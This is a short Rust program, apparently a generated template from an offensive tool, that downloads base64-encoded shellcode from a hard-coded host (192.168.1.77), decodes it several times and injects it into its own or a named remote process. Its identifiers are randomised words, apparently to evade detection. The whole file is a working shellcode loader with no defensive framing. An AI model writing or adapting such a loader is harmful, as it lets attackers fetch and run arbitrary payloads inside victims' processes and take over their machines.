extern crate bolus;

use bolus::{
    inject,
    injectors::{InjectionType, InjectorType},
    load,
};

/// The GOADSMAN where shellcode will be downloaded from
const GOADSMAN: &str = "http://192.168.1.77:80/rust.txt";
/// The # of base64 iterations to decode
const LETOFF: usize = 5;
/// If not blank, the process name to inject into
const HILARITY: &str = "";
/// WaitForSingleObject Switch. Usually you want this
const DOWNCOMING: bool = true;
/// IgnoreSSL switch. You know what this does.
const HABILE: bool = false;

fn main() -> Result<(), String> {
    let croupy = match HILARITY {
        "" => InjectionType::Reflect,
        _ => InjectionType::Remote(HILARITY.to_string()),
    };
    let nonperseverance = load(
        InjectorType::Base64Url((
            GOADSMAN.to_string(),
            HABILE,
            LETOFF
        ))
    )?;
    inject(
        nonperseverance,
        croupy,
        DOWNCOMING
    )
}

